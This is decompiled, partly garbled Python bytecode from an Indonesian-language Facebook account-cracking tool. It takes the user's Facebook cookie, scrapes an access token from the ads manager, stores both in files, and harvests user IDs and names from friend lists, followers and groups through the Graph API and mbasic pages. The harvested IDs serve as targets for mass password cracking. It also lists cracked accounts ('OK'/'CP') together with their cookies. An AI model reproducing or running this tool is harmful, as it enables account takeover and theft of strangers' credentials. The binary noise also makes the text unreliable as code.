�| � �d�t          � �d�t          � �d�t          � �d�t          � �d�t          � �d�| � �d�t          � �d�t          � �d�t          � �d�| � �d�t          � �d�t          � �d�t          � �d�| � �d�t          � �d�t          � �d�t          � �d�| � �d�t          � �d�t          � �d�t          � �d�| � �d�t          � �d�t          � �d�t          � �d�t          � �d�| � �d�t          � �d�t          � �d�t          � �d�| � �d�t          � �d�t          � �d�t          � �d�t          � �d�| � �d ��  �        �  �         d S )!NrC   u5   [1;97m╭──────────────[z Author : The TEAM_1778 u�   ]
[1;97m│
[1;97m│ ╭[[41m[1;37m Status : Premium [0m[1;97m]─────────────━[38;5;196m㋱[38;5;226m•[1;97m[u�   AHMAD[1;97m]•[38;5;196m㋱[1;97m━╮
[1;97m│ │                                                [1;97m│
[1;97m│ │ u�      █████╗ ██╗  ██╗███╗   ███╗ █████╗ ██████╗   [1;97m│         
[1;97m│ │   u�   ██╔══██╗██║  ██║████╗ ████║██╔══██╗██╔══██╗  [1;97m│         
[1;97m│[1;97m │   u�   ███████║███████║██╔████╔██║███████║██║  ██║  [1;97m│         
[1;97m│ [1;97m│   u�   ██╔══██║██╔══██║██║╚██╔╝██║██╔══██║██║  ██║  [1;97m│         
[1;97m│[1;97m │  u�    ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║██████╔╝ [1;97m │         
[1;97m│ [1;97m│   u}   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝   [1;97m│
╰─[�MENUu�   ]──────────────────────────────────[[41m[1;37m KAK AHMAD [0m[1;97m]╯
[1;97m├───�[r/   �]z Crack Publik   r)   u#    Crack Pengikut
[1;97m├───r3   z Crack Massal   r1   u    Crack Grup
[1;97m├───r�   z Crack Fileu   √    r5   u     Lihat Hasil
[1;97m├───r-   u   ×    ra   z Keluar/Out)�random�choicer   �k�h�br�   �pr   �join�sir�x)�bos    r   �bannerr�   �   s�  � ��m�Q�q��1�Q�q�M�"�"��� Y� Y� Y� Y�B� Y� Y� Y� Y�� Y� Y� Y� Y�ef� Y� Y� Y� Y� ac�Y� Y� Y� Y� �	Y� Y� Y� Y�
 �Y� Y� Y� Y�  "�Y� Y� Y� Y�  "�Y� Y� Y� Y� !�Y� Y� Y� Y�  "�Y� Y� Y� Y� 	
�Y� Y� Y� Y� �Y� Y� Y� Y� �Y� Y� Y� Y� �Y� Y� Y� Y�  !�Y� Y� Y� Y� $&�Y� Y� Y� Y� 89�Y� Y� Y� Y� <=�Y� Y� Y� Y� @A�Y� Y� Y� Y� DF�Y� Y� Y� Y� �Y� Y� Y� Y� �Y� Y� Y� Y�  !�Y� Y� Y� Y� $&�Y� Y� Y� Y� 89�Y� Y� Y� Y� <=�Y� Y� Y� Y� @A�Y� Y� Y� Y� DF�Y� Y� Y� Y� �Y� Y� Y� Y� �Y� Y� Y� Y�  !�Y� Y� Y� Y� $&�Y� Y� Y� Y� 34�Y� Y� Y� Y� =>�Y� Y� Y� Y� AB�Y� Y� Y� Y� EF�Y� Y� Y� Y� IK�Y� Y� Y� Y� �Y� Y� Y� Y� �Y� Y� Y� Y�  !�Y� Y� Y� Y� $&�Y� Y� Y� Y� 34�Y� Y� Y� Y� <=�Y� Y� Y� Y� @A�Y� Y� Y� Y� DE�Y� Y� Y� Y� HJ�Y� Y� Y� Y� Y� Y� Z� Z� Z� Z� Zr   c                  �  � 	 t          dd�  �        �                    �   �         } t          dd�  �        �                    �   �         }t          �                    | �  �         	 t	          j        dt          d         z   d|i��  �        }t          j        |j        �  �        d         }t          j        |j        �  �        d	         }t          ||�  �         d S # t          $ r t          �   �          Y d S t          j        j        $ r! t          d
�  �         t          �   �          Y d S w xY w# t           $ r t          �   �          Y d S w xY w)N�
.token.txtrH   �.cok.txtz:https://graph.facebook.com/me?fields=id,name&access_token=r   �cookie��cookies�name�idu+   ╰─ Internet Anda Sedang Sibuk/Tidak Ada)ry   rz   �tokenkur}   r~   r   �json�loadsr�   �menu�KeyError�login_lagi334�
exceptions�ConnectionErrorr   �exit�IOError)�token�cok�sy�sy2�sy3s        r   r�   r�   �   sE  � ��
�|�C�
 �
 �
%�
%�
'�
'�%��Z����!�!�#�#�#�	�.�.�����	
���Q�RY�Z[�R\�\�go�ps�ft�u�u�u�2�	��B�G�	�	�V�	$�3�	��B�G�	�	�T�	"�3���C�=�=�=�=�=��	� � � ��?�?�?�?�?�?�	�	�	,� 
� 
� 
��	6�7�7�7��6�6�6�6�6�6�
����� 	� � � ��/�/�/�/�/�/����s=   �AD) �!A4C �D&�/D) �20D&�"D) �%D&�&D) �)E�Ec                  �,  � 	 t          j        �   �         } t          d�  �        }d|i}d}| �                    ||��  �        }t	          j        dt          |j        �  �        �  �        �                    d�  �        }|�d|�d�}| �                    ||��  �        }t	          j        d	t          |j        �  �        �  �        �                    d�  �        }t          d
d�  �        �
                    |�  �        }	t          dd�  �        �
                    |�  �        }
t          d�  �         t          �   �          d S # t          $ rP}t          j        d�  �         t          j        d�  �         t          d�  �         t          �   �          Y d }~d S d }~ww xY w)Nu   
╰─ Masukan Cookie : r�   z4https://www.facebook.com/adsmanager/manage/campaignsr�   zact=(.*?)&nav_sourcer   z?act=z&nav_source=no_referrerzaccessToken="(.*?)"r�   rG   r�   u   
╰─ Login Berhasil bre zrm -f .token.txtzrm -f .cok.txtu0   [0m╰─ Login Gagal Atau Token/Cookie Expired)r~   �Session�inputr   r�   �searchr   �content�groupry   r�   r   r�   �	Exceptionr�   r�   )�sesr�   r�   �url�req�set�nek�roq�tok�tokenw�cokiewr�   s               r   r�   r�   �   s}  � �	�����#��-�.�.�&��f��'�>�#�����G��$�$�#�
�	�(��S�[�)9�)9�:�:�@�@��C�C�#�,/�C�C����4�#�����G��$�$�#�
�	�'��C�K�(8�(8�9�9�?�?��B�B�#���c�"�"�(�(��-�-�&��
�C� � �&�&�v�.�.�&��&�'�'�'��&�&�&�&�&��� 	� 	� 	��)������)������>�?�?�?��&�&�&�&�&�&�&�&�&�����		���s   �D5D9 �9
F�AF�Fc                 ��  � t          j        d�  �         t          j        d�  �        j        }t          �   �          t          dt          � dt          � d��  �         t          d�  �        }|dv rt          �   �          d S |dv rt          �   �          d S |d	v rt          �   �          d S |d
v rt          �   �          d S |dv rt          �   �          d S |dv rt          �   �          d S |dv rVt          j        d�  �         t!          d�  �         t!          d�  �         t#          j        d�  �         t'          �   �          d S t)          t+          d�  �        �  �         t'          �   �          d S )Nr�   zhttps://api.ipify.org�   [1;97m├──╭[r�   ��   ]──────────────────────────────────────────────�   [1;97m│  ╰─➣[1;97m �r/   r�   �r3   r�   �r)   r�   �r1   r�   �r�   r�   �r5   r�   �ra   �00zrm -rf .token.txt�   │u'   ╰───[•] Sedang Mengapus Tokenr   z[cyan]Pilih Yang Bener Lah Bang)r�   r�   r~   r   r�   r�   r�   r�   r�   r�   �dump_publik�dump_massal�dump_pengikut�grup�
crack_file�resultr   r�   r�   r�   �cetak�nel)�my_name�my_id�ip�_alvino_ganteng_s       r   r�   r�   �   s~  � ���7�����l�*�+�+�0�������  w��  w�  w��  w�  w�  w�  x�  x�  x��@�A�A���
�"�"��-�-�-�-�-��*�$�$��-�-�-�-�-��*�$�$��/�/�/�/�/��*�$�$��&�&�&�&�&��*�$�$��,�,�,�,�,��*�$�$��(�(�(�(�(��*�$�$��)�� � � ���,�,�,��2�3�3�3��*�Q�-�-�-��&�&�&�&�&���.�/�/�0�0�0��&�&�&�&�&r   c                  �   � t          d�  �         t          d�  �         t          j        d�  �         t          �   �          d S )Nr�   u-   ├───[•] Fitur Ini Sedang Diperbaiki�   )r   r�   r�   r�   r�   r   r   �errorr    s6   � ��u�����6�7�7�7���A���������r   c                  �  � t          d�  �         t          dt          � dt          � dt          � dt          � d�	�  �         t          dt          � dt          � dt          � dt          � d	�	�  �         t          dt          � d
t          � d��  �         t          dt          � dt          � d��  �         t          d�  �        } | dv �r3t          j        d�  �        }nd# t          $ rW d}t          �   �         �                     t          |d��  �        �  �         t          j        d�  �         t          �   �          Y nw xY wt          |�  �        dk    rVd}t          �   �         �                     t          |d��  �        �  �         t          j        d�  �         t          �   �          d S t          t!          d�  �        �  �         d}i }|D �]g}t#          d|z   d�  �        �                    �   �         }n#  Y �-xY w|dz  }|dk     r�d
t'          |�  �        z   }|�                    t'          |�  �        t'          |�  �        i�  �         |�                    |t'          |�  �        i�  �         t          d|z   dz   |z   dz   t'          t          |�  �        �  �        z   d z   t          z   �  �         ��|�                    t'          |�  �        t'          |�  �        i�  �         t          dt'          |�  �        z   dz   |z   dz   t'          t          |�  �        �  �        z   d z   t          z   �  �         ��id!}	t          �   �         �                     t          |	d��  �        �  �         t          d"�  �        }
||
         }nP# t*          $ rC d#}t          �   �         �                     t          |d��  �        �  �         t-          �   �          Y nw xY wt#          d|z   d�  �        �                    �   �         �                    �   �         }n[#  d$}t          �   �         �                     t          |d%��  �        �  �         t          j        d�  �         t          �   �          Y nxY wd}t3          t          |�  �        �  �        D ][}||         �                    d&�  �        }t          � d'|d         � d&|d         � �}t          t!          |d(�)�  �        �  �         |dz  }�\t          d*�  �         t          �   �          d S | d+v �r<t          j        d,�  �        }nd# t          $ rW d}t          �   �         �                     t          |d-��  �        �  �         t          j        d�  �         t          �   �          Y nw xY wt          |�  �        dk    rVd.}t          �   �         �                     t          |d-��  �        �  �         t          j        d�  �         t          �   �          d S t          t!          d/�  �        �  �         d}i }|D �]g}t#          d0|z   d�  �        �                    �   �         }n#  Y �-xY w|dz  }|d1k     r�d
t'          |�  �        z   }|�                    t'          |�  �        t'          |�  �        i�  �         |�                    |t'          |�  �        i�  �         t          d|z   dz   |z   dz   t'          t          |�  �        �  �        z   d z   t          z   �  �         ��|�                    t'          |�  �        t'          |�  �        i�  �         t          dt'          |�  �        z   dz   |z   dz   t'          t          |�  �        �  �        z   d z   t          z   �  �         ��it          t!          d2�  �        �  �         t          d3�  �        }
||
         }nP# t*          $ rC d#}t          �   �         �                     t          |d4��  �        �  �         t          �   �          Y nw xY wt#          d0|z   d�  �        �                    �   �         �                    �   �         }n[#  d$}t          �   �         �                     t          |d4��  �        �  �         t          j        d�  �         t          �   �          Y nxY wd}t3          t          |�  �        �  �        D ]z}||         �                    d&�  �        }d5|d         � d&|d         � �}t          t!          |d(�)�  �        �  �         t          t6          � d6t          � |d         � ��  �         |dz  }�{t          d7�  �         t          �   �          d S | d8v rt          �   �          d S d#}t          �   �         �                     t          |d4��  �        �  �         t          �   �          d S )9Nu�   ├───────────────────────────────────────────────────────�   ├───[r/   �] Hasil zCP zAnda r3   zOK zAnda  ra   z] Kembali Ke Menuu   ├──╭[�HASILr�   u   │  ╰─➣[1;97m r�   �CPz# DIREKTORI TIDAK DITEMUKAN�yellow��styler$   r   z# ANDA BELUM MEMILIKI RESULT CPuG   [1;97m├───[1;97m[[32m+[1;97m] HASIL CP ANDA ADA DIBAWAH INJ�CP/rH   r   rd   r�   �] z ==>> z Akunz# List Hasil Andau7   [1;97m────[1;97m[[32m+[1;97m] Pilih 🤪 : z# PILIHAN TIDAK ADA DI MENUz+# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGIzbold yellow�|z Checkpoint : rC   ��titleu   ────[•] Kembali : r�   �OK�greenz# ANDA BELUM MEMILIKI RESULT OKu#   ├───[•] List Akun OK Anda�OK/rK   u.   ├───[•] Pilih Angka Ngav Bukan Hurufu     [•] Pilih : z
bold greenz
Live/OK : z	COOKIE : u   ├───[•] Kembali : r�   )r   r�   r�   r�   r   r�   r�   �listdir�FileNotFoundError�sol�markr�   r�   r�   r
   r�   r�   ry   �	readlinesr   �updater�   r�   rz   r{   �range�splitr�   )�_____andika_hd_____�vin�gada�haha�cih�lol�isi�hem�nom�gerr2�geeh�geh�ric�lin�hehe�nocp�cpku�cpkuni�cpkuhs                      r   r�   r�     s�  � ��  r�  s�  s�  s��4�q�4�4�1�4�4�a�4�4�A�4�4�4�5�5�5��5�q�5�5�1�5�5�a�5�5�A�5�5�5�6�6�6��/�q�/�/�1�/�/�/�0�0�0��  n�q�  n�  n�q�  n�  n�  n�  o�  o�  o��8�9�9���:�%�%��J�t���c�c��	� 
� 
� 
�
'�4��5�5�;�;�t�D��)�)�)�*�*�*��:�a�=�=�=��6�6�6�6�6�	
����
 	��X�X�q�[�[�
+�4��5�5�;�;�t�D��)�)�)�*�*�*��:�a�=�=�=��6�6�6�6�6���b�	c�	c�d�d�d�	
�3�	�3�� C� C�s��5��9�S�!�!�+�+�-�-�����8�8������F�C�
�2�v�v��s�3�x�x�<�S��Z�Z��S���#�c�(�(�#�$�$�$��Z�Z��S��X�X�����
�3�s�7�4�<���H�$�S��S���]�]�2�7�:�1�<�=�=�=�=��Z�Z��S���#�c�(�(�#�$�$�$�
�3�s�3�x�x�<���S� ��)�#�c�#�h�h�-�-�7��?��A�B�B�B�B��5��5�5�;�;�t�E��*�*�*�+�+�+�
�U�
V�
V�4���Y�s�s��
� � � �
'�C��E�E�K�K��S��)�)�)�*�*�*��F�F�F�F�F����� �%��)�C� � �%�%�'�'�2�2�4�4�s�s���8�D��E�E�K�K��T��/�/�/�0�0�0��J�q�M�M�M��F�F�F�F�F����	�4��S��X�X��� � �t��t�9�?�?�3���F��
5�
5�f�Q�i�
5�
5�&��)�
5�
5�E�	�#�e�2�
�
�
�����1�H�D�D��	'�(�(�(��6�6�6�6�6��Z�'�'��J�t���c�c��	� 
� 
� 
�
'�4��5�5�;�;�t�D��(�(�(�)�)�)��:�a�=�=�=��6�6�6�6�6�	
����
 	��X�X�q�[�[�
+�4��5�5�;�;�t�D��(�(�(�)�)�)��:�a�=�=�=��6�6�6�6�6���2�	3�	3�4�4�4�	
�3�	�3�� C� C�s��5��9�S�!�!�+�+�-�-�����8�8������F�C�
�3�w�w��s�3�x�x�<�S��Z�Z��S���#�c�(�(�#�$�$�$��Z�Z��S��X�X�����
�3�s�7�4�<���H�$�S��S���]�]�2�7�:�1�<�=�=�=�=��Z�Z��S���#�c�(�(�#�$�$�$�
�3�s�3�x�x�<���S� ��)�#�c�#�h�h�-�-�7��?��A�B�B�B�B���=�	>�	>�?�?�?�
�"�
#�
#�4���Y�s�s��
� � � �
'�C��E�E�K�K��S��-�-�-�.�.�.��F�F�F�F�F����� �%��)�C� � �%�%�'�'�2�2�4�4�s�s���8�D��E�E�K�K��T��.�.�.�/�/�/��J�q�M�M�M��F�F�F�F�F����	�4��S��X�X��� � �t��t�9�?�?�3���F�
.�v�a�y�
.�
.�6�!�9�
.�
.�E�	�#�e�2�
�
�
����	�Q�
'�
'��
'�F�1�I�
'�
'�(�(�(��1�H�D�D��	'�(�(�(��6�6�6�6�6��Z�'�'��&�&�&�&�&�%�#��%�%�+�+�d�3�l�+�+�+�,�,�,��&�&�&�&�&s~   �C �AD:�9D:�%G1�1G5�2M; �;A
O�O�7P �AQ�<T �AU2�1U2�%X)�)X-�^ �A
_*�)_*�-7`% �%Aa=r�   �   ✓r�   c                  ��   � t          dt          � dt          � d�t          t          �  �        z  �  �         t          t          � dt          � dt          � d��  �         t          d�  �         	 t          �   �          d S )Nrx   z>> Total Id Yang Terkumpul :� %s z>> [ zKlik Enter r  rC   )r   r�   r�   r
   r�   r�   r   �settingr�   r   r   �lahr5  �  sq   � ��2�A�2�2�1�2�2�2�C��G�G�<�=�=�=��!�%�%�!�%�%��%�%�%�&�&�&��r����������r   c                  �  � t          d�  �         t          dt          � dt          � dt          � d��  �        } d}d|i}d| z   }t	          j        �   �         }	 t          |�                    ||�	�  �        j        d
�  �        }nK# t          j	        j
        $ r4 t          d�  �         t          j        d�  �         t          �   �          Y nw xY w|�                    d�  �        }|j        �                    dd�  �        �                    dd�  �        }|dk    r2t          d�  �         t          j        d�  �         t!          �   �          n9|dk    r2t#          d�  �         t          j        d�  �         t!          �   �          n	 t          dt          � dt          � dt          � dt$          � d�	|z  �  �         |�                    d�  �        }g }	|D ]K}
|
j        }|�                    dd�  �        }	 t)          |�  �        }|	�                    |�  �        }�E#  Y �IxY wt-          |	�  �        dk    rt          d�  �         n9t          dt          � dt          � dt          � dt.          � d�	|	d         z  �  �         t1          |�  �         d S )N�
   [1;97m│�   [1;97m├───r�   �   ÷z#] Masukkan Username Atau Id Grup : ��Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba�
user-agent�#https://mbasic.facebook.com/groups/��headers�html.parseru8   [1;97m├───{x}[{k}•{x}] Sinyal Loo Kek Kontol �      �?r  � | FacebookrC   � Grup Publik�Masuk Facebookz5 Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..�	Kesalahanu8   [1;97m├───{x}[{k}•{x}] Grup Tidak Di Temukan �   •z] Nama Grup : �%s�table�Anggotar   z Anggota : -z] Anggota : )r   r�   r�   r�   r~   r�   �parserr   r�   r�   r�   r�   r�   r�   �find�replacer�   �	alvino_xyr�   �find_all�intr}   r
   r�   �grup1)r�   r�   �miskinlur�   r�   �gn�berr�berr2�ggs�ang�ff�anggo�bro�mex�jumlahs                  r   r�   r�   �  s�  � �������T�Q�T�T��T�T�a�T�T�T�U�U�� z���2���,�R�/�������	��c�g�g�c�8�g�,�,�1�=�A�A�"�"����+� 	� 	� 	��E�F�F�F��*�S�/�/�/��&�&�&�&�&�	���� 	�������	��	�	�=��	,�	,�	4�	4�^�B�	G�	G��	�����?�@�@�@��*�S�/�/�/��&�&�&�&��[����I�J�J�J��*�S�/�/�/��&�&�&�&�
��@��@�@�A�@�@�!�@�@�1�@�@�@�%�H�I�I�I�	�{�{�7����	��� � �R�
�'�%����i��#�#�#��	�S���3��J�J�s�O�O�6�6����4������H�H�a�K�K��������?��?�?�Q�?�?�1�?�?�!�?�?�?��Q��H�I�I�I��s�����s   �*B �AC
�	C
�.$H�Hc                 �Z	  � g }t          j        �   �         }t          dt          � dt          � dt          � d��  �         t          dt          � dt          � dt          � dt          � dt          � dt
          � dt          � d	��  �         	 	 d}d|i}	 |d         }n	#  | }Y nxY wt          |�                    ||��  �        j        d�  �        }|�	                    d�  �        }|D ]�}t          |�  �        �                    d�  �        }	d|	v rft          |�  �        �                    dd�  �        �                    dd�  �        }
|
�                    d�  �        d         �                    dd�  �        }��|�	                    d�  �        }|D �]<}|j        }|�                    d�  �        }d|v r�t          j        dt          |�  �        �  �        }|d         �                    dd�  �        }|�                    dd�  �        }|dz   |z   }|t          v r��t          �                    |�  �         t          dt"          z   t$          z   dz   t          z   d z   t          t'          t          �  �        �  �        z   t$          z   d!z   d�"�  �         t(          j        �                    �   �          ��d|v �rt          j        dt          |�  �        �  �        }|d         �                    dd�  �        }|�                    d#�  �        d         }|dz   |z   }|t          v r���t          �                    |�  �         t/          j        t
          t          t$          t2          t4          t          g�  �        }t          d$t          � d%|� d&t          � d'�t'          t          �  �        z  d�"�  �         t(          j        �                    �   �          ��<��>	 |}|�                    dd(|z   �  �         n`#  |�                    d)�  �        }|j        �                    d*d�  �        �                    d+d�  �        }|d,k    rnt;          �   �          Y nxY wng# t           j        j        $ r7 	 tA          j!        d-�  �         n# tD          $ r t;          �   �          Y nw xY wY ntD          $ r t;          �   �          Y nw xY w��&).Nr8  r�   rE  z] Sedang Mengumpulkan ID z] Klik zCtrl+Cz Untuk �Stopz Dump !!Tr:  r;  r   r=  r?  r�   �>zLihat Postingan Lainnya</spanz	<a href="rC   zamp;rM   z"><imgrG  �
mengajukanzcontent_owner_id_new.\w+zcontent_owner_id_new.z mengajukan pertanyaan .r  �z { zProses Mengambil ID � }��endz > u   	———>> �(r3  u   ) <<———�https://mbasic.facebook.comr  rA  rB  rC  r   )#r~   r�   r   r�   r�   r   rI  r   r�   rM  r   r  rK  r�   r�   r�   r}   �balmondr�   r
   r�   r�   r�   r�   r�   r�   r�   �insertrJ  r5  r�   r�   r�   r�   �KeyboardInterrupt)�urls�user�   r�   rP  r�   r�   �bf2�g�css�bcj�bcj2�tes�cari�liatnih�spl�idsiapa�idyou�namayou�idku�xy�link_�girang�girang2s                           r   rO  rO  �  sy  � �	��������F��F�F�A�F�F�!�F�F�F�G�G�G��Y��Y�Y�A�Y�Y�!�Y�Y�A�Y�Y�Q�Y�Y�q�Y�Y�a�Y�Y�Y�Z�Z�Z�:	�9	� 	|�2��R� �8��
�a�&�C�C���
�C�C�C����	�����X��.�.�3�]�	C�	C�3�	���c�	�	�3�� 3� 3�q�
�a�&�&�,�,�s�
�
�C�&�#�-�-��q�6�6�>�>�+�b�)�)�1�1�&��<�<�S��I�I�c�N�N�1��%�%�h�r�2�2�T��	���g�	�	�3�� � �t��i�G�
�-�-��
�
�C��s����z�4�S��Y�Y�?�?�W��Q�Z��� 7��;�;�U����9�"�=�=�W��#�I�g��T���
�
���i�i��o�o�o��T�'�\�!�^�E�!�!�#�$:�:�3�s�2�w�w�<�<�G��I�$�N�UW�X�X�X�X�Y\�Yc�Yi�Yi�Yk�Yk�Yk�Yk�	�����z�4�S��Y�Y�?�?�W��Q�Z��� 7��;�;�U��}�}�U�#�#�A�&�W��#�I�g��T���
�
���i�i��o�o�o��=�!�A�a��!�A��'�'�b��:�a�:�:�"�:�:�!�:�:�:�C��G�G�D�"�M�M�M�M�c�j�N^�N^�N`�N`�N`�N`��	��E��J�J�q�.�u�4�5�5�5�5����X�X�g���F��k�!�!�-��3�3�;�;�N�2�N�N�G�� � � �	��U�U�U��������	�	�	,� 
� 
� 
�
��J�r�N�N�N�N��
� 
� 
� 
��E�E�E�E�E�
������	� 	� 	� 	��5�5�5�5�5�	����s:	sn   �Q �B �Q �B�L*Q �O# �"Q �#AQ �>Q �R(�Q.�-R(�.R	�R(�R	�	R(�R(�'R(c                  �\  � 	 t          dd�  �        �                    �   �         } n# t          $ r t          �   �          Y nw xY w	 t          dd�  �        �                    �   �         }n# t          $ r t          �   �          Y nw xY wt	          d�  �         t	          dt
          � dt          � dt          � dt          � d	�	�  �         t          d
�  �        }	 t          j
        d|z   dz   t          d         z   d|i��  �        �                    �   �         }|d         d         D ]5}t          �                    |d         dz   |d         z   �  �         �/#  Y �3xY wt	          dt
          � d�t          t!          t          �  �        �  �        z   �  �         t#          �   �          d S # t          j        j        $ r8 t	          t          � d��  �         t	          d�  �         t)          �   �          Y d S t*          t          f$ r0 t	          d�  �         t	          d�  �         t)          �   �          Y d S w xY w)Nr�   rH   r�   r7  u   [1;97m├───[rE  z] Ketik �Mez# Jika Ingin Dump Dari Teman SendiriuA   [1;97m├───[1;97m[[32m+[1;97m] input Id Target 😛 : � https://graph.facebook.com/v2.0/�)?fields=friends.limit(5000)&access_token=r   r�   r�   �friends�datar�   r  r�   u9   [1;97m├───[1;97m[[32m+[1;97m] Total Id 🤪 :rM   �?   [1;97m├───[1;97m[[32m+[1;97m] Sinyal Lo kek Kontol �B   [1;97m├───[1;97m[[32m+[1;97m] Pertemanan Tidak Public )ry   rz   r�   r�   r   r�   r�   r�   r�   r~   r   r�   r�   r�   r}   r   r
   r4  r�   r�   r�   r�   �r�   r�   �pil�koh2�pis        r   r�   r�   �  sl  � �	�
�|�C�
 �
 �
%�
%�
'�
'�%�%��� 	� 	� 	��&�&�&�&�&�	����	��Z����!�!�#�#�#�#��� 	� 	� 	��&�&�&�&�&�	����������]��]�]�q�]�]�!�]�]�q�]�]�]�^�^�^��]�^�^��	�	��8��<�=h�h�ip�qr�is�s�  AI�  JM�  @N�  
O�  
O�  
O�  
T�  
T�  
V�  
V�$���O�F�#� � �b�	�y�y��D��#��b��j�(�)�)�)�)���(�(�����T�PQ�T�T�T�UX�Y\�]_�Y`�Y`�Ua�Ua�a�b�b�b�	�)�)�)�)�)����+� 	� 	� 	��1��������U�V�V�V��&�&�&�&�&�&�	�'�� 	� 	� 	�������X�Y�Y�Y��&�&�&�&�&�&�	���sS   �"% �A �A �"A' �'B�B�AF  �",E�F  �E�AF  � AH+�+<H+�*H+c                  �B  � 	 t          dd�  �        �                    �   �         } t          dd�  �        �                    �   �         }n# t          $ r t          �   �          Y nw xY w	 t	          t          d�  �        �  �        }n-# t          $ r  t          d�  �         t          �   �          Y nw xY w|dk     s|dk    rt          d�  �         t          �   �          t          j	        �   �         }d	}t          |�  �        D ]C}|dz  }t          d
t          |�  �        z   dz   �  �        }t          �                    |�  �         �Dt          D ]�}	 |�                    d|z   dz   t          d	         z   d|i��  �        �                    �   �         }|d         d         D ]B}		 |	d         dz   |	d         z   }
|
t"          v rnt"          �                    |
�  �         �<#  Y �@xY w��# t$          t          f$ r Y ��t          j        j        $ r/ t          d�  �         t          d�  �         t          �   �          Y ��w xY w	 t          dt*          � d�t          t-          t"          �  �        �  �        z   �  �         t/          �   �          d S # t          j        j        $ r8 t          t0          � d��  �         t          d�  �         t3          �   �          Y d S t$          t          f$ rD t          d�  �         t          d�  �         t5          j        d�  �         t3          �   �          Y d S w xY w)Nr�   rH   r�   uD   [1;97m├───[1;97m[[32m+[1;97m] how Many Target ID 🤔 : uM   [1;97m├───[1;97m[[32m+[1;97m] input id target, not privet bro ok r   rK   u>   [1;97m├───[1;97m[[32m+[1;97m] Totall Dump ID 😱 r   u=   [1;97m├───[1;97m[[32m+[1;97m] input ID you chose � : r}  r~  r�   r�   r  r�  r�   r  r�   uA   [1;97m├───[1;97m[[32m+[1;97m] Sinyal Loh Kek Kontoll uF   [1;97m├───[1;97m[[32m+[1;97m] Total ID Yang Terkumpul 🤑rM   r�   r�  r�  �   )ry   rz   r�   r�   rN  r�   �
ValueErrorr   r~   r�   r  r   �uidr}   r   r�   r�   r�   r�   r�   r�   r�   r
   r4  r�   r�   r�   r�   )r�   r�   �jumr�   �yz�met�kl�userr�col�mi�isos              r   r�   r�     sf  � �	�
�|�C�
 �
 �
%�
%�
'�
'�%��Z����!�!�#�#�#�#��� 	� 	� 	��&�&�&�&�&�	����	��E�d�e�e�f�f�#�#��� 	� 	� 	��c�d�d�d��&�&�&�&�&�	���� ��E�E�S��W�W��T�U�U�U��&�&�&���������#�J�J� � �S��a�%�"��X�Y\�]_�Y`�Y`�`�af�f�g�g�"��*�*�R�.�.�.�.�� 
� 
�U�
�	���3�E�9�:e�e�fm�no�fp�p�  ~G�  HK�  }L��  
M�  
M�  
R�  
R�  
T�  
T�3���^�F�#� � �r���t�H�S�L��F��#�S��r�	�	�$�
�)�)�C�.�.�.����8�8������ �7�	� � � ��4�	�	�	,� 
� 
� 
���:�:�:��	X�Y�Y�Y��6�6�6�6�6�
����	��a�]^�a�a�a�be�fi�jl�fm�fm�bn�bn�n�o�o�o�	�)�)�)�)�)����+� 	� 	� 	��1�	�	�	�����U�V�V�V��&�&�&�&�&�&�	�'�� 	� 	� 	���,�,�,��X�Y�Y�Y��*�Q�-�-�-��&�&�&�&�&�&�		���sp   �AA �A"�!A"�&B �'B-�,B-�AG�8G�G�G�G�H1�/?H1�0H1�5AI? �?AL�
AL�Lc                  �  � 	 t          dd�  �        �                    �   �         } n# t          $ r t          �   �          Y nw xY w	 t          dd�  �        �                    �   �         }n# t          $ r t          �   �          Y nw xY wt	          d�  �         t	          d�  �         t          d�  �        }	 t          j        d|z   dz   t          d	         z   d
|i��  �        �	                    �   �         }|d         d         D ]5}t          �                    |d         dz   |d         z   �  �         �/#  Y �3xY wt	          dt          t          t          �  �        �  �        z   �  �         t          �   �          d S # t          j        j        $ r! t	          d�  �         t          �   �          Y d S t"          t          f$ r! t	          d�  �         t          �   �          Y d S w xY w)Nr�   rH   r�   r�   uY   [1;97m├───[1;97m[[32m+[1;97m] Ketik me Jika Ingin Dump Dari Pengikut Sendiri u?   [1;97m├───[1;97m[[32m+[1;97m] Masukkan Id Target : zhttps://graph.facebook.com/z.?fields=subscribers.limit(99999)&access_token=r   r�   r�   �subscribersr�  r�   r  r�   u:   [1;97m├───[1;97m[[32m+[1;97m] Total ID 😱 : u@   [1;97m├───[1;97m[[32m+[1;97m] Sinyal Luu Kek Kontol uA   [1;97m├───[1;97m[[32m+[1;97m] Dump Gagal/Token Rusak )ry   rz   r�   r�   r   r�   r~   r   r�   r�   r�   r}   r   r
   r4  r�   r�   r�   r�  s        r   r�   r�   C  s  � �	�
�|�C�
 �
 �
%�
%�
'�
'�%�%��� 	� 	� 	��&�&�&�&�&�	����	��Z����!�!�#�#�#�#��� 	� 	� 	��&�&�&�&�&�	�����u�����o�p�p�p��[�\�\��	�	��3�C�7�8h�h�ip�qr�is�s�  AJ�  KN�  @O�  
P�  
P�  
P�  
U�  
U�  
W�  
W�$�����'� � �b�	�y�y��D��#��b��j�(�)�)�)�)���(�(�����P�QT�UX�Y[�U\�U\�Q]�Q]�]�^�^�^�	�)�)�)�)�)����+� 	� 	� 	��V�W�W�W��&�&�&�&�&�&�	�'�� 	� 	� 	��W�X�X�X��&�&�&�&�&�&�	���sR   �"% �A �A �"A' �'B�B�3AE6 �,D.�-E6 �.D2�0AE6 �61G�*-G�Gc                  �  � d} t          | d��  �        }t          �   �         �                    |�  �         t          d�  �        }d|z   }t	          j        �   �         }	 t          |�                    |ddi��  �        j        d	�  �        }nu# t          j	        j
        $ r^ d
} t          t          d��  �        }t          �   �         �                    |�  �         t          j        d�  �         t          �   �          Y nw xY w|�                    d�  �        }|j        �                    dd�  �        �                    dd�  �        }|dk    r\d} t          t          d��  �        }t          �   �         �                    |�  �         t          j        d�  �         t          �   �          nc|dk    r\d} t          t          d��  �        }t          �   �         �                    |�  �         t          j        d�  �         t          �   �          n	 |�                    d�  �        }g }	|D ]K}
|
